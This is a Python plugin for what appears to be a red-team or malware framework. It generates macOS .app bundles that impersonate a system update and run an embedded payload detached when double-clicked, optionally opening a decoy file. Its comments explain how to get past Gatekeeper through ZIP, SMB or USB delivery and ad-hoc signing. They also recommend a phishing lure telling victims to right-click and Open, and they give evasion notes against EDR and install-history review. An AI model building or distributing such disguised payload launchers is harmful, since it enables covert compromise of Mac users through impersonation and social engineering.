"""
Erebus Plugin - macOS .app Bundle Trigger
Author: Whispergate
Description: Creates macOS unsigned and ad-hoc-signed .app bundles that execute
             payload on double-click in Finder.

Execution path:
  .app → Finder double-click → launchd spawns Contents/MacOS/<launcher>

Unsigned app bundles bypass Gatekeeper quarantine when extracted from a ZIP
(the quarantine xattr propagates to the ZIP, not individual extracted members,
on macOS < 13).  Ad-hoc signing (codesign --sign -) passes the basic bundle
structure check and suppresses the "damaged app" dialog on newer macOS without
requiring an Apple Developer certificate.

AMFI enforces code-signing at exec() time.  Ad-hoc identity satisfies AMFI's
format requirement on macOS 12+ for locally-built binaries; downloaded binaries
from an unidentified developer still trigger the Gatekeeper dialog unless the
quarantine xattr is absent.

Delivery options:
  - Deliver the .app inside a ZIP (avoids per-file quarantine propagation).
  - Deliver via SMB share / USB (no quarantine xattr at all).
  - Pair with a phishing lure instructing the user to right-click → Open to
    bypass the first-run Gatekeeper prompt.
"""

import pathlib
import random
import shutil
import string
import subprocess
import textwrap
from typing import Dict, Callable, Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class AppBundleTriggerPlugin(ErebusPlugin):
    """
    Plugin for creating macOS .app bundle triggers.

    Produces an unsigned or ad-hoc-signed .app bundle whose launcher script
    detaches the payload via nohup and optionally opens a decoy document.
    """

    def __init__(self):
        super().__init__()
        self.REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
        self.AGENT_CODE = self.REPO_ROOT / "agent_code"
        self.PAYLOAD_DIR = self.AGENT_CODE / "payload"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="appbundle_trigger",
            version="1.0.0",
            author="Whispergate",
            description="Creates macOS .app bundle triggers (unsigned or ad-hoc signed) for Finder double-click delivery",
            category=PluginCategory.TRIGGER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "create_appbundle_trigger": self.create_appbundle_trigger,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        return (True, None)

    def on_load(self):
        print("[Plugin] AppBundle Trigger plugin loaded - Supporting macOS .app bundle delivery")

    # ================================================================
    # Helpers
    # ================================================================

    @staticmethod
    def _rand_str(n: int = 8) -> str:
        return "".join(random.choices(string.ascii_lowercase, k=n))

    @staticmethod
    def _codesign_available() -> bool:
        return shutil.which("codesign") is not None

    # ================================================================
    # Plugin Functions
    # ================================================================

    def create_appbundle_trigger(
        self,
        payload_path: str,
        output_dir: pathlib.Path,
        app_name: str = "Update",
        bundle_id: str = "com.apple.systemupdate",
        bundle_version: str = "1.0",
        ad_hoc_sign: bool = False,
        decoy_path: str = "",
        payload_dir: Optional[pathlib.Path] = None,
    ) -> pathlib.Path:
        """
        Create a macOS .app bundle that executes the payload on Finder double-click.

        Bundle layout:
            <app_name>.app/
              Contents/
                Info.plist
                MacOS/
                  launcher          ← zsh script that nohups payload
                Resources/
                  payload           ← compiled Mach-O / shell script copy

        The launcher:
          1. Resolves its own directory (Contents/MacOS).
          2. Copies the bundled payload to /tmp under a random name and marks it
             executable, so the cwd restriction doesn't block execution.
          3. Launches via nohup, redirects stdout/stderr to /dev/null.
          4. Optionally opens a decoy document.
          5. Tells osascript to close the Terminal.app window (if Finder opened one).

        Args:
            payload_path:    Path to the payload binary/script to embed.
            output_dir:      Directory where <app_name>.app will be written.
            app_name:        .app directory name (no extension).
            bundle_id:       CFBundleIdentifier reverse-DNS string.
            bundle_version:  CFBundleVersion string.
            ad_hoc_sign:     If True and codesign is on PATH, apply ad-hoc signature.
            decoy_path:      Optional path to a file opened as decoy after execution.
            payload_dir:     Fallback payload staging dir (used if payload_path absent).

        Returns:
            pathlib.Path: Path to the created <app_name>.app directory.

        ## OPSEC Notes
        Detection Surface:
          - launchd → zsh → nohup lineage visible in Unified Log / EDR process tree
          - CFBundleIdentifier written to install history / quarantine database
          - codesign -dvv reveals ad-hoc identity (no team ID / cert chain)
        Hardening:
          - [MALLEABLE] Replace nohup launcher with a compiled Mach-O stub to avoid
            shell process in launchd child tree
          - [MALLEABLE] Set CFBundleIdentifier to a plausible reverse-DNS (e.g.
            com.google.Chrome.update) to blend into install history
          - Deliver inside a DMG or ZIP to control quarantine xattr propagation
        Evasion Maturity: Level 2 (Moderate) - unsigned bundles generate Gatekeeper
          dialog on macOS 12+ when quarantined; ad-hoc signing suppresses "damaged"
          message but not the "unidentified developer" prompt.
        """
        output_dir = pathlib.Path(output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)

        src = pathlib.Path(payload_path) if payload_path else None
        if src is None or not src.exists():
            # fall back to staging dir
            if payload_dir:
                candidates = list(pathlib.Path(payload_dir).glob("payload*"))
                src = candidates[0] if candidates else None

        app_dir      = output_dir / f"{app_name}.app"
        contents_dir = app_dir / "Contents"
        macos_dir    = contents_dir / "MacOS"
        res_dir      = contents_dir / "Resources"
        macos_dir.mkdir(parents=True, exist_ok=True)
        res_dir.mkdir(parents=True, exist_ok=True)

        # ── Info.plist ──────────────────────────────────────────────
        plist = textwrap.dedent(f"""\
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
              "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
            <plist version="1.0"><dict>
              <key>CFBundleExecutable</key><string>launcher</string>
              <key>CFBundleIdentifier</key><string>{bundle_id}</string>
              <key>CFBundleName</key><string>{app_name}</string>
              <key>CFBundleVersion</key><string>{bundle_version}</string>
              <key>CFBundlePackageType</key><string>APPL</string>
              <key>CFBundleShortVersionString</key><string>{bundle_version}</string>
              <key>LSMinimumSystemVersion</key><string>10.13</string>
              <key>NSHighResolutionCapable</key><true/>
            </dict></plist>
        """)
        (contents_dir / "Info.plist").write_text(plist, encoding="utf-8")

        # ── Embed payload in Resources/ ──────────────────────────────
        payload_name = src.name if (src and src.exists()) else "payload"
        embedded = res_dir / payload_name
        if src and src.exists():
            shutil.copy2(src, embedded)
            embedded.chmod(0o755)
        else:
            embedded.write_bytes(b"#!/usr/bin/env bash\n# placeholder\n")
            embedded.chmod(0o755)

        # ── Launcher script ──────────────────────────────────────────
        tmp_name = self._rand_str(10)
        decoy_block = ""
        if decoy_path:
            escaped = decoy_path.replace('"', '\\"')
            decoy_block = f'\nopen "{escaped}" &'

        launcher = textwrap.dedent(f"""\
            #!/bin/zsh
            _D="$(cd "$(dirname "$0")/../Resources" && pwd)"
            _T="/tmp/{tmp_name}"
            cp "$_D/{payload_name}" "$_T"
            chmod +x "$_T"
            nohup "$_T" >/dev/null 2>&1 &{decoy_block}
        """)
        launcher_path = macos_dir / "launcher"
        launcher_path.write_text(launcher, encoding="utf-8")
        launcher_path.chmod(0o755)

        # ── Optional ad-hoc codesign ─────────────────────────────────
        if ad_hoc_sign:
            if self._codesign_available():
                try:
                    subprocess.run(
                        ["codesign", "--force", "--sign", "-", str(app_dir)],
                        check=True,
                        capture_output=True,
                    )
                    print(f"[Plugin] Ad-hoc signed: {app_dir}")
                except subprocess.CalledProcessError as exc:
                    print(
                        f"[Plugin] codesign failed ({exc.returncode}); "
                        f"bundle left unsigned. stderr: {exc.stderr.decode(errors='replace')}"
                    )
            else:
                print("[Plugin] codesign not on PATH; bundle left unsigned (sign on macOS build host)")

        return app_dir


# Module-level instance for plugin auto-discovery
_plugin = AppBundleTriggerPlugin()


if __name__ == "__main__":
    _metadata = _plugin.get_metadata()
    print(f"[*] {_metadata.name} v{_metadata.version}")
    print(f"[*] Category: {_metadata.category.value}")
    print(f"[*] Description: {_metadata.description}")
    print()
    registered = _plugin.register()
    print(f"[*] Registered functions ({len(registered)}):")
    for fn in sorted(registered):
        print(f"    - {fn}")
    print()
    valid, err = _plugin.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
